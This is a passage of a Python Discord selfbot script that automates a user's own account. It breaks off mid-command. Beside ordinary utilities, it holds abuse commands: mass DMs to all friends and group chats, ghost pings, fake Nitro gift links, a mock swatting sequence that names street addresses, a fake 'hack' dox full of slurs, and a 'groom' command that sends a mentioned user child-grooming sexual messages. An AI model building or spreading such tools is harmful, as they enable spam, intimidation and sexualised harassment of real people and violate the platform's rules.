            await confirmation.delete()

    except Exception as e:
        await ctx.send(f"```Error Code: {e} — Please contact the owner.```")

@bot.command()
async def deletefrom(ctx, user: discord.User, amount: int = 20):
    if amount < 1:
        await ctx.send("Please specify an amount greater than 0.")
        return
    deleted = 0
    async for msg in ctx.channel.history(limit=amount*5): 
        if msg.author == user and msg.author != ctx.author:
            continue  
        if msg.author == ctx.author and deleted < amount:
            if isinstance(ctx.channel, discord.DMChannel) or (user in msg.mentions):
                try:
                    await msg.delete()
                    deleted += 1
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f"Failed to delete message: {e}")
    await ctx.send(f"Deleted {deleted} messages related to {user}.", delete_after=5)

@bot.command()
async def dmwipe(ctx, user: discord.User):
    if not isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("This command only works in DMs.")
        return
    deleted = 0
    async for msg in ctx.channel.history(limit=1000):
        if msg.author == ctx.author and user in msg.mentions:
            try:
                await msg.delete()
                deleted += 1
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed to delete message: {e}")
    await ctx.send(f"Deleted {deleted} messages mentioning {user}.", delete_after=5)


import os
import json
from datetime import datetime

REPORTS_FOLDER = "reports"

if not os.path.exists(REPORTS_FOLDER):
    os.mkdir(REPORTS_FOLDER)

@bot.command()
async def report(ctx, user: discord.User, *, reason):
    report_file = os.path.join(REPORTS_FOLDER, f"{user.id}.json")
    report_data = {
        "reported_by": ctx.author.id,
        "reason": reason,
        "timestamp": datetime.utcnow().isoformat()
    }
    if os.path.exists(report_file):
        with open(report_file, "r") as f:
            reports = json.load(f)
    else:
        reports = []

    reports.append(report_data)

    with open(report_file, "w") as f:
        json.dump(reports, f, indent=4)

    await ctx.send(f"Report saved for {user} for reason: {reason}", delete_after=5)

@bot.command()
async def modlogs(ctx, user: discord.User):
    report_file = os.path.join(REPORTS_FOLDER, f"{user.id}.json")
    if not os.path.exists(report_file):
        await ctx.send(f"No reports found for {user}.")
        return

    with open(report_file, "r") as f:
        reports = json.load(f)

    msg = f"Modlogs for {user}:\n"
    for idx, r in enumerate(reports[-5:], 1): 
        reported_by = await bot.fetch_user(r['reported_by'])
        msg += f"{idx}. By: {reported_by} | Reason: {r['reason']} | At: {r['timestamp']}\n"

    await ctx.send(msg)

@bot.command()
async def coinflip(ctx):
    import random
    result = random.choice(["Heads", "Tails"])
    await ctx.send(f"[🎲] Coinflip result: {result}")

@bot.command()
async def roll(ctx, sides: int = 6):
    import random
    if sides < 2:
        await ctx.send("Dice must have at least 2 sides.")
        return
    result = random.randint(1, sides)
    await ctx.send(f"[🎲] You rolled a {result} on a {sides}-sided dice.")

@bot.command()
async def joke(ctx):
    import random
    jokes = [
        "Why don't scientists trust atoms? Because they make up everything!",
        "Why did the scarecrow win an award? Because he was outstanding in his field!",
        "I told my wife she was drawing her eyebrows too high. She looked surprised."
    ]
    await ctx.send(random.choice(jokes))

@bot.command()
async def sayowo(ctx, *, text: str):
    owo_text = text.replace('r', 'w').replace('l', 'w').replace('R', 'W').replace('L', 'W')
    await ctx.send(owo_text + " owo~")

@bot.command()
async def fliptext(ctx, *, text: str):
    flip_map = {
        'a':'ɐ', 'b':'q', 'c':'ɔ', 'd':'p', 'e':'ǝ', 'f':'ɟ',
        'g':'ƃ', 'h':'ɥ', 'i':'ᴉ', 'j':'ɾ', 'k':'ʞ', 'l':'ʃ',
        'm':'ɯ', 'n':'u', 'o':'o', 'p':'d', 'q':'b', 'r':'ɹ',
        's':'s', 't':'ʇ', 'u':'n', 'v':'ʌ', 'w':'ʍ', 'x':'x',
        'y':'ʎ', 'z':'z', 'A':'∀', 'B':'𐐒', 'C':'Ɔ', 'D':'p',
        'E':'Ǝ', 'F':'Ⅎ', 'G':'⅁', 'H':'H', 'I':'I', 'J':'ſ',
        'K':'ʞ', 'L':'˥', 'M':'W', 'N':'N', 'O':'O', 'P':'Ԁ',
        'Q':'Q', 'R':'ɹ', 'S':'S', 'T':'┴', 'U':'∩', 'V':'Λ',
        'W':'M', 'X':'X', 'Y':'⅄', 'Z':'Z', '0':'0', '1':'Ɩ',
        '2':'ᄅ', '3':'Ɛ', '4':'ㄣ', '5':'ϛ', '6':'9', '7':'ㄥ',
        '8':'8', '9':'6', ',':'\'', '.':'˙', '?':'¿', '!':'¡',
        '"':'„', '\'':',', '(':')', ')':'(', '[':']', ']':'[',
        '{':'}', '}':'{', '<':'>', '>':'<', '&':'⅋', '_':'‾'
    }
    flipped = ''.join(flip_map.get(c, c) for c in text[::-1])
    await ctx.send(flipped)

from discord.ext import commands
import discord
import aiohttp
import io
from PIL import Image
import asyncio
import os
import subprocess

@bot.command()
async def img2gif(ctx, *urls):
    if not urls:
        await ctx.send("Please provide image URLs.")
        return

    images = []
    async with aiohttp.ClientSession() as session:
        for url in urls:
            try:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        await ctx.send(f"Couldn't download image from {url}")
                        return
                    data = await resp.read()
                    img = Image.open(io.BytesIO(data)).convert('RGBA')
                    images.append(img)
            except Exception as e:
                await ctx.send(f"Failed to load image: {e}")
                return

    if len(images) < 2:
        await ctx.send("Need at least 2 images to make a GIF.")
        return

    gif_bytes = io.BytesIO()
    images[0].save(
        gif_bytes,
        format='GIF',
        save_all=True,
        append_images=images[1:],
        duration=500,
        loop=0
    )
    gif_bytes.seek(0)

    await ctx.send(file=discord.File(fp=gif_bytes, filename='output.gif'))

@bot.command()
async def vid2gif(ctx, url: str = None):
    video_bytes = None

    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        if attachment.size > 8_000_000:
            return await ctx.send("File too large (max 8MB).")
        video_bytes = await attachment.read()

    elif ctx.message.reference:
        try:
            replied_msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
            if replied_msg.attachments:
                attachment = replied_msg.attachments[0]
                if attachment.size > 8_000_000:
                    return await ctx.send("Replied file too large (max 8MB).")
                video_bytes = await attachment.read()
        except:
            pass

    elif url:
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        return await ctx.send("Failed to download video.")
                    video_bytes = await resp.read()
            except Exception as e:
                return await ctx.send(f"Error fetching video: {e}")

    if not video_bytes:
        return await ctx.send("Please attach a video, reply to one, or provide a video URL.")

    with open("temp_vid.mp4", "wb") as f:
        f.write(video_bytes)

    try:
        subprocess.run([
            "ffmpeg", "-y",
            "-i", "temp_vid.mp4",
            "-t", "5",  # limit duration to first 5 seconds
            "-vf", "fps=15,scale=480:-1:flags=lanczos",
            "temp_output.gif"
        ], check=True)

        with open("temp_output.gif", "rb") as gif_file:
            await ctx.send(file=discord.File(gif_file, "output.gif"))

    except subprocess.CalledProcessError as e:
        await ctx.send(f"FFmpeg error: {e}")
    except Exception as e:
        await ctx.send(f"Unexpected error: {e}")

    finally:
        if os.path.exists("temp_vid.mp4"):
            os.remove("temp_vid.mp4")
        if os.path.exists("temp_output.gif"):
            os.remove("temp_output.gif")


import aiohttp
from discord.ext import commands

@bot.command()
async def urban(ctx, *, term: str):
    """
    Looks up a term on Urban Dictionary.
    Usage: .urban <term>
    """
    url = f"http://api.urbandictionary.com/v0/define?term={term}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                return await ctx.send("Error: Could not reach Urban Dictionary.")
            data = await resp.json()

    if not data['list']:
        return await ctx.send(f"No results found for **{term}**.")

    definition = data['list'][0]['definition']
    example = data['list'][0]['example']
    
    def truncate(text, limit=1000):
        return text if len(text) <= limit else text[:limit] + "..."

    msg = f"**{term}**\nDefinition:\n{truncate(definition)}\n\nExample:\n{truncate(example)}"
    await ctx.send(msg)

import aiohttp
from discord.ext import commands

@bot.command()
async def weather(ctx, *, city: str):
    url = f"http://wttr.in/{city}?format=j1"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                return await ctx.send(f"Could not get weather for '{city}'.")
            data = await resp.json()

    current = data['current_condition'][0]
    temp_c = current['temp_C']
    feels_like = current['FeelsLikeC']
    humidity = current['humidity']
    desc = current['weatherDesc'][0]['value']
    wind_kph = current['windspeedKmph']

    msg = (f"Weather in **{city.title()}**:\n"
           f"{desc}\n"
           f"Temperature: {temp_c}°C (Feels like {feels_like}°C)\n"
           f"Humidity: {humidity}%\n"
           f"Wind Speed: {wind_kph} km/h")

    await ctx.send(msg)

@bot.command()
async def massdm(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'```[Invalid]: It\'s, {bot.command_prefix}massdm <message>```')
        return  
    for friend in bot.user.friends:
        try:
            await friend.send(message)
            print(f"message sent to {friend.name}#{friend.discriminator}")
        except discord.Forbidden:
            print(f"Failed to send message to {friend.name}#{friend.discriminator} (blocked or dms are off)")
        except Exception as e:
            print(f"error sending message to {friend.name}#{friend.discriminator}: {e}")
        await asyncio.sleep(4.0)

@bot.command()
async def massgc(ctx, *, message: str):

    global massgc_task

    if massgc_task and not massgc_task.done():
        await ctx.send("```use stopmass to cancel```")
        return

    async def dm_group_chats():
        try:
            group_chats = [gc for gc in bot.private_channels if isinstance(gc, discord.GroupChannel)]
            for gc in group_chats:
                try:
                    await gc.send(message)
                    await asyncio.sleep(0.50)  
                except Exception as e:
                    print(f"Could not send message to group chat {gc}: {e}")
            await ctx.send("Mass GC DM completed.")
        except Exception as e:
            await ctx.send(f"Error during mass GC DM: {e}")

    massgc_task = asyncio.create_task(dm_group_chats())
    await ctx.send("```message sending to all groupchats.```")


@bot.command(name='massunadd')
async def massunadd(ctx):

    try:
        
        friends = bot.user.friends

        if not friends:
            await ctx.send("You have no friends to unadd.")
            return

        await ctx.send(f"Starting to unfriend {len(friends)} users...")

        
        for friend in friends:
            await friend.remove_friend() 
            await asyncio.sleep(1)  
        
        await ctx.send("Successfully unfriended all users.")

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")   

@bot.command()
async def stopmass(ctx):

    global massdm_task, massgc_task

    if massdm_task and not massdm_task.done():
        massdm_task.cancel()
        await ctx.send("massdm pasued")
    else:
        await ctx.send("no massdm command is running")

    if massgc_task and not massgc_task.done():
        massgc_task.cancel()
        




@bot.command()
async def swat(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author

    gender = ["Male", "Female", "Non-Binary", "Other"]
    age = str(random.randint(18, 50))
    height = ['5\'5\"', '5\'8\"', '6\'0\"', '6\'2\"']
    location = ["1305 Tarragon Dr Flower Mound, Texas(TX), 75028", "28261 W Thome Rd Rock Falls, Illinois(IL), 61071", "1508 2nd St NW Bowman, North Dakota(ND), 58623", "60 Gertrude Rd Dalton, Massachusetts(MA), 01226",]
    occupation = ["Software Engineer", "Artist", "Teacher", "Chef"]
    name = ['Alex Johnson', 'Jamie Lee', 'Taylor Smith', 'Jordan Brown']

    await ctx.send(f"swatting {user.mention}...\n")
    await asyncio.sleep(1)

    await ctx.send(f"```📞 *9-1-1: Hello, what is ur emergency*```")
    await asyncio.sleep(1)

    await ctx.send(f"{user.mention} my name is {random.choice(name)} i am very scared my parents were fighting and then i heard a big band like a bomb. . . .")
    await asyncio.sleep(1)
    
    await ctx.send(f"📞 okay calm down and get somewhere safe were do you live?")
    await asyncio.sleep(1)

    await ctx.send(f"i- i live at {random.choice(location)} please hurrry ")
    await asyncio.sleep(1)

    await ctx.send(f"📞 SWAT is coming shortly remain safe we will arrive soon")
    await asyncio.sleep(1)


    await ctx.send(f"🚓 SWAT: starts breaking down {user.mention} door ")
    await asyncio.sleep(1)

    await ctx.send(f"https://media.discordapp.net/attachments/1310177406732075101/1312274470504890421/b9b7b37cb0cf5e495d6512d30c56a4fb.gif?ex=674be656&is=674a94d6&hm=139874281c9b4d402eab13afd0669cd07505a18147aea95fa75277706ca32da5&=")
    await asyncio.sleep(1)
                        
    await ctx.send(f"🚓 SWAT: YOUR UNDERARRESTRED {user.mention}  ")
    await asyncio.sleep(1)

    await ctx.send(f"🚓 SWAT: targets {user.mention}")
    await asyncio.sleep(1)

    await ctx.send(f"{user.mention} I DIDN'T DO ANYTHING HELP \n")
    await asyncio.sleep(1)

    await ctx.send(f"🚓 SWAT: GET DOWN ON THE FLOOR {user.mention}")
    await asyncio.sleep(1)

    await ctx.send(f"{user.mention} I DIDNT DO ANYTHING HELP \n")
    await asyncio.sleep(1)


    await ctx.send(f"*🚓 SWAT: locks up {user.mention}*")
    await asyncio.sleep(1)

    await ctx.send(f"Successfully swatted {user.mention} \n")
    await asyncio.sleep(1)
    
    await ctx.send(f"```Details:```"
                   f"```Name: {random.choice(name)}\n"
                   f"Gender: {random.choice(gender)}\n"
                   f"Age: {age}\n"
                   f"Height: {random.choice(height)}\n"
                   f"Location: {random.choice(location)}\n"
                   f"Occupation: {random.choice(occupation)}\n```")


@bot.command()
async def nitro(ctx, amount: int=None):
    await ctx.message.delete()
    if amount is None:
        await ctx.send(f'{bot.command_prefix}nitro <amount>')
        return
    for _ in range(amount):
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f'https://discord.gift/{code}')
        await asyncio.sleep(0.50)


@bot.command()
async def ghostping(ctx, user: discord.User, amount: int = 1):
    for _ in range(amount):
        try:
            msg = await ctx.send(user.mention)
            await asyncio.sleep(0.4)
            await msg.delete()
        except:
            pass


from gtts import gTTS

@bot.command()
async def tts(ctx, *, message: str):
    try:
        tts = gTTS(text=message, lang='en')
        tts.save("tts.mp3")
        await ctx.send(file=discord.File("tts.mp3"))
    except Exception as e:
        await ctx.send(f"```TTS failed: {e}```") 


@bot.command()
async def dick(ctx, member: discord.Member = None):
    member = member or ctx.author 

    length = random.randint(1, 20)

    pp_string = "3" + "=" * length + "D"

    await ctx.send(f"{pp_string} {member.mention}  {length} inches")


@bot.command() 
async def gay(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("```mention a user for the command to work properly```")
        return

    gay_percent = random.randint(1, 100)  
    response = f"`{member.mention} is {gay_percent}% gay`"
    await ctx.send(response)

@bot.command()
async def hack(ctx, user: discord.Member=None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
    content=f"```Successfully hacked {user}\n"
            f"Name: {random.choice(name)}\n"
            f"Gender: {random.choice(gender)}\n"
            f"Age: {age}\n"
            f"Height: {random.choice(height)}\n"
            f"Weight: {weight}\n"
            f"Hair Color: {random.choice(hair_color)}\n"
            f"Skin Color: {random.choice(skin_color)}\n"
            f"DOB: {dob}\n"
            f"Location: {random.choice(location)}\n"
            f"Phone: {phone}\n"
            f"E-Mail: {user.name + random.choice(email)}\n"
            f"Passwords: {', '.join(random.choices(password, k=3))}\n"
            f"Occupation: {random.choice(occupation)}\n"
            f"Annual Salary: {random.choice(salary)}\n"
            f"Ethnicity: {random.choice(ethnicity)}\n"
            f"Religion: {random.choice(religion)}\n"
            f"Sexuality: {random.choice(sexuality)}\n"
            f"Education: {random.choice(education)}\n"
            "```"
)






@bot.command()
async def python(ctx, *, script_name: str):
    
    try:

        if not script_name.endswith('.py'):
            await ctx.send("```add .py at the end```")
            return
       
        if not os.path.isfile(script_name):
            await ctx.send(f"```Script {script_name} isnt in vsc```")
            return

        
        subprocess.Popen(["python", script_name])
        await ctx.send(f"```starting {script_name}```")

    except Exception as e:
        await ctx.send(f"Failed to start script: {e}")

# @bot.command()
# async def banner(ctx, user: discord.User):
#    try:
#        async with aiohttp.ClientSession() as session:
#            async with session.get(f'https://discord.com/api/v9/users/{user.id}', headers={'Authorization': bot.http.token}) as resp:
#                if resp.status == 200:
#                    data = await resp.json()
#                    banner_id = data.get('banner')
#                    if banner_id:
#                        banner_url = f'https://cdn.discordapp.com/banners/{user.id}/{banner_id}.{"gif" if banner_id.startswith("a_") else "png"}?size=1024'
#                        await ctx.send(banner_url)
#                    else:
#                        flags = data.get('public_flags', 0)
#                        has_nitro = flags & (1 << 9)
#                        
#                                                
#                        if has_nitro:
#                            default_banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{user.discriminator}.gif"
#                            await ctx.send(default_banner_url)
#                       else:
#                            await ctx.send("This user doesn't have a banner.")
#                else:
#                    await ctx.send(f"Failed to fetch user data. Status code: {resp.status}")
#    except Exception as e:
#        await ctx.send(f"An error occurred: {str(e)}")      

# copy_targets = {}

# @bot.command()
# async def copy(ctx, user: discord.User):
#     """Start copying everything a user says."""
#     copy_targets[user.id] = ctx.channel.id
#     await ctx.send(f"Started copying {user.mention}.")
# 
# @bot.command()
# async def stopcopy(ctx, user: discord.User = None):
#     """Stop copying a specific user or all users."""
#     if user:
#         if user.id in copy_targets:
#             del copy_targets[user.id]
#             await ctx.send(f"Stopped copying {user.mention}.")
#         else:
#             await ctx.send(f"{user.mention} is not being copied.")
#     else:
#         copy_targets.clear()
#         await ctx.send("Stopped copying all users.")
# 
# @bot.event
# async def on_message(message):
#     # Prevent the bot from processing its own messages
#     if message.author.bot:
#         return
#    # Handle copying messages
#     if message.author.id in copy_targets:
#         target_channel_id = copy_targets[message.author.id]
#         if message.channel.id == target_channel_id:
#             try:
#                 await message.channel.send(message.content)
#             except discord.HTTPException as e:
#                 print(f"Failed to copy message: {e}")
# 
#     # Handle reacting to messages
#     if message.author.id in react_targets:
#         emojis = react_targets[message.author.id]
#        for emoji in emojis:
#             try:
#                 await message.add_reaction(emoji)
#             except discord.HTTPException:
#                 print(f"Failed to add reaction {emoji} to message from {message.author}")
# 
#     # Handle mass reacting
#     if reacting and message.channel == react_channel:
#         try:
#             for emoji in react_emojis:
#                 await message.add_reaction(emoji)
#         except discord.HTTPException as e:
#             print(f"[ERROR] Failed to react: {e}")
# 
#    # Ensure other commands still work
#    await bot.process_commands(message)


# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work # 

@bot.command()
async def banner(ctx, user: discord.User = None):
    user = user or ctx.author
    try:
        user_data = await bot.http.request(
            discord.http.Route("GET", f"/users/{user.id}")
        )
        banner_hash = user_data.get("banner")

        if banner_hash:
            if banner_hash.startswith("a_"):
                ext = "gif"
            else:
                ext = "png"
            banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{ext}?size=512"
            await ctx.send(f"{user.name}'s banner: {banner_url}")
        else:
            await ctx.send(f"{user.name} has no banner.")
    except Exception as e:
        await ctx.send(f"Error fetching banner: {e}")

@bot.command()
async def pingtest(ctx):
    latency = bot.latency * 1000 
    await ctx.send(f"Spectra's Ping is: `{latency:.2f}ms`")

@bot.command()
async def steale(ctx, emoji: str = None):
    if emoji is None:
        await ctx.send("Please provide an emoji to steal. Example: `,steale :emoji:`")
        return

    match = re.search(r"<(a?):(\w+):(\d+)>", emoji)
    if not match:
        await ctx.send("Invalid emoji format. Make sure it's a custom emoji.")
        return

    animated, name, emoji_id = match.groups()
    file_type = "gif" if animated == "a" else "png"
    url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{file_type}?v=1"
    await ctx.send(f"Emoji `{name}` → {url}")

import discord
from discord.ext import commands

@bot.command()
async def stealsticker(ctx):
    target_message = ctx.message.reference and await ctx.channel.fetch_message(ctx.message.reference.message_id)

    if not target_message or not target_message.stickers:
        await ctx.send("Please reply to a message that contains a sticker.")
        return

    sticker = target_message.stickers[0]
    name = sticker.name
    url = sticker.url

    png_url = url.replace(".json", ".png").replace(".gif", ".png").replace(".webp", ".png")

    await ctx.send(f"Sticker `{name}` as PNG → {png_url}")

@bot.command()
async def servers(ctx):
    servers_list = [f"- {guild.name} (`{guild.id}`)" for guild in bot.guilds]
    
    msg_chunks = []
    chunk = "**Your Servers:**\n"

    for line in servers_list:
        if len(chunk + line + "\n") > 2000:
            msg_chunks.append(chunk)
            chunk = ""
        chunk += line + "\n"
    
    if chunk:
        msg_chunks.append(chunk)

    for i, part in enumerate(msg_chunks):
        if i == 0 and not part.startswith("**Your Servers:**"):
            part = "**Your Servers (continued):**\n" + part
        await ctx.send(part)


@bot.command()
async def joinserver(ctx, *, invite: str = None):
    if invite is None:
        await ctx.send("Please provide an invite link or server ID to join.")
        return

    invite_code = None

    invite_match = re.search(r"(?:discord\.gg|discordapp\.com/invite)/([a-zA-Z0-9\-]+)", invite)
    if invite_match:
        invite_code = invite_match.group(1)
    else:
        await ctx.send("Invalid invite link. Please provide a valid Discord invite link.")
        return

    try:
        invite_obj = await bot.fetch_invite(invite_code)
        await bot.accept_invite(invite_obj)
        await ctx.send(f"Joined server: {invite_obj.guild.name}")
    except Exception as e:
        await ctx.send(f"Failed to join server: {e}")








































import asyncio
import discord
from discord.ext import commands

is_rape_active = False

@bot.command()
async def groom(ctx, member: discord.Member = None):
    global is_rape_active

    if member is None:
        await ctx.send("**Please mention a user to ra⁣pe.**")
        return

    if is_rape_active:
        await ctx.send("Another rap⁣ing is already active. Please stop it first.")
        return

    is_rape_active = True 

    await ctx.message.delete()
    await ctx.send(f"Rap⁣ing {member.mention}...")
    await asyncio.sleep(5)

    lines = [
        f"hey.... {member.mention}",
        f"you look kinda cute ;)~ {member.mention}",
        f"would you like to come back to my place...~ {member.mention} for a little fun? ;)~",
        f"i promise i won’t bite...~ {member.mention}",
        f"i just want to have some fun...~ {member.mention}",
        f"i have some candy...~ {member.mention}",
        f"i have a big...~ {member.mention} surprise for you...~",
        f"i want to show you my...~ {member.mention} special place...~",
        f"i want to take you to my...~ {member.mention} secret place...~",
        f"you know...~ {member.mention} the one with the big...~",
        f"you would love it...~ {member.mention}",
        f"i promise it will be fun...~ {member.mention}",
        f"i just want to have a little...~ {member.mention} fun with you...~💋",
        f"╭ᑎ╮~ {member.mention} thats daddy's little pen⁣is..~",
        f"mmm...~ {member.mention} I can’t wait to see you...🤤",
        f"i have a special treat for you...~ {member.mention} my good good little b..boy...~😉",
        f"mmmmm....~ {member.mention} You're such a cutie.. 😘",
        f"{member.mention} https://media0.giphy.com/media/NAC6XEuIBxyPAf25z9/giphy.mp4?cid=73b8f7b14ee527b56b1932b59093375519c6205266adedce&rid=giphy.mp4&ct=g"
    ]

    for line in lines:
        if not is_rape_active:  
            await ctx.send("Rap⁣ing stopped.")
            break
        await asyncio.sleep(1)
        await ctx.send(line)

    is_rape_active = False  

@bot.command()
async def stopgroom(ctx):
    global is_rape_active

    if not is_rape_active:
        await ctx.send("No active rap⁣ing to stop.")
        return

    is_rape_active = False  
    await ctx.send("")



@bot.command()
async def ageplay(ctx, member: discord.Member = None):
    global is_ageplay_active

    if member is None:
        await ctx.send("**Please mention a user to ageplay with.**")
        return

    if is_ageplay_active:
        await ctx.send("Another ageplaying session is already active. Please stop it first.")
        return

    is_ageplay_active = True 

    await ctx.message.delete()
    await ctx.send(f"Ageplaying {member.mention}...")
    await asyncio.sleep(5)

    lines = [
        f"hey.... {member.mention}",
